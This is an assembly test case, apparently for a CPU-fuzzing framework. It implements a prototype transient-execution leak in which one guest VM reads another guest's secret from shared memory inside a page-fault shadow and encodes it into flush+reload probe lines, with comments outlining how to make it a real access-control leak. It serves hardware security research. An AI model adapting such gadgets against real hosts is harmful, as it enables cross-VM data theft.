.intel_syntax noprefix

# ============================================================================
# manual shared-memory transient-leak prototype (hand-written gadget — no random_instructions).
#
# actors (config-shmem-poc.yaml, = tsa-l1d layout):
#   main      host, kernel                — orchestrator
#   vmvictim  guest, kernel               — writes a controlled secret to the shared buffer
#   vm        guest, kernel, observer, ro — reads it transiently + f+r (attacker)
#
# both guests alias main (hpa_gpa) => vmvictim and vm share main's physical data page. the victim
# writes secret byte s to shared offset 0x140 (line 5). the observer opens a #pf window (store to its
# read-only faulty page) and, in the fault shadow, reads the shared 0x140 and encodes s into its f+r
# probe as line (s & 0x3f). if the htrace's differing line tracks s, transient shared-mem exfil works.
#
# threat-model caveat: vm's shared page is readable, so this proves the transient exfil pipeline over a
# shared buffer (with a controlled secret + the ct-ni detector), not yet an access-control break. to
# turn it into a hard leak, block vm's architectural read of 0x140 (permission) and rely on the
# microtag false-completion — the follow-up once this fires.
# ============================================================================

# ----------------------------- host (orchestrator) --------------------------
.section .data.main
.function_main_0:
.macro.set_h2g_target.vm.function_vm_0: nop qword ptr [rax + 0xff]
.macro.set_g2h_target.main.function_main_1: nop qword ptr [rax + 0xff]
# vm arms f+r (measurement_start)
.macro.switch_h2g.vm.0: nop qword ptr [rax + 0xff]

.function_main_1:
.macro.landing_g2h.main_1: nop qword ptr [rax + 0xff]
.macro.set_h2g_target.vmvictim.function_vmvictim_0: nop qword ptr [rax + 0xff]
.macro.set_g2h_target.main.function_main_2: nop qword ptr [rax + 0xff]
# victim writes + caches the secret
.macro.switch_h2g.vmvictim.0: nop qword ptr [rax + 0xff]

.function_main_2:
.macro.landing_g2h.main_2: nop qword ptr [rax + 0xff]
.macro.set_h2g_target.vm.function_vm_1: nop qword ptr [rax + 0xff]
.macro.set_g2h_target.main.function_main_3: nop qword ptr [rax + 0xff]

xor rax, rax  # noremove
xor rbx, rbx  # noremove
xor rcx, rcx  # noremove
xor rdx, rdx  # noremove
xor rsi, rsi  # noremove
xor rdi, rdi  # noremove
.patch_placeholder:

# vm transient retrieval + measurement_end
.macro.switch_h2g.vm.1: nop qword ptr [rax + 0xff]

.function_main_3:
.macro.landing_g2h.main_3: nop qword ptr [rax + 0xff]
.macro.fault_handler: nop qword ptr [rax + 0xff]
.patch_placeholder_fault_handler:
.macro.set_h2g_target.vm.function_vm_2: nop qword ptr [rax + 0xff]
.macro.set_g2h_target.main.function_main_4: nop qword ptr [rax + 0xff]
.macro.switch_h2g.vm.2: nop qword ptr [rax + 0xff]

.function_main_4:
.macro.landing_g2h.main_4: nop qword ptr [rax + 0xff]
nop

# ----------------------------- victim: place the secret in the shared buffer ---
.section .data.vmvictim
.function_vmvictim_0:
.macro.landing_h2g.vmvictim_0: nop qword ptr [rax + 0xff]
mov rax, qword ptr [r14 + 0x2000]          # secret s <- victim input (reg-init slot 0)
mov byte ptr [r14 + 0x140], al             # write s to shared offset 0x140 (line 5) — fixed addr
movzx rbx, byte ptr [r14 + 0x140]          # read back -> cache shared line 5 in l1d
mfence
.macro.switch_g2h.main.vmvictim_0: nop qword ptr [rax + 0xff]
lfence

# ----------------------------- attacker: transient read of the shared secret ---
.section .data.vm
.function_vm_0:
.macro.landing_h2g.vm_0: nop qword ptr [rax + 0xff]
.macro.measurement_start: nop qword ptr [rax + 0xff]
.macro.switch_g2h.main.vm_0: nop qword ptr [rax + 0xff]
lfence

.function_vm_1:
.macro.landing_h2g.vm_1: nop qword ptr [rax + 0xff]
xor rax, rax  # noremove
mov rax, qword ptr [r14 + 0x2000] # noremove
mov rbx, qword ptr [r14 + 0x2008] # noremove
mfence # noremove
mov qword ptr [r14 + 0x1000], rax          # store to ro faulty page (writable:false) -> #pf
# --- fault shadow (transient; never architecturally retired) ---
# proven 090802 pattern: transient load of the secret, then a dependent transient store whose
# address is the secret value -> the probe line touched = s & 0x3f (store leaves an rfo footprint).
movzx rcx, byte ptr [r14 + 0x140]          # transient read of the shared secret s (line 5)
and rcx, 0x3f                               # low 6 bits of s
shl rcx, 6                                  # * 64b -> one probe line per value bucket
mov byte ptr [r14 + rcx], al               # encode: dependent transient store -> probe line (s & 0x3f)
# --- end shadow ---
lfence  # noremove
.macro.measurement_end.vm_1: nop qword ptr [rax + 0xff]
.macro.switch_g2h.main.1: nop qword ptr [rax + 0xff]
lfence

.function_vm_2:
.macro.landing_h2g.vm_2: nop qword ptr [rax + 0xff]
.macro.measurement_end.vm_2: nop qword ptr [rax + 0xff]
.macro.switch_g2h.main.2: nop qword ptr [rax + 0xff]
lfence

# ----------------------------- exit -----------------------------------------
.section .data.main
.test_case_exit:nop
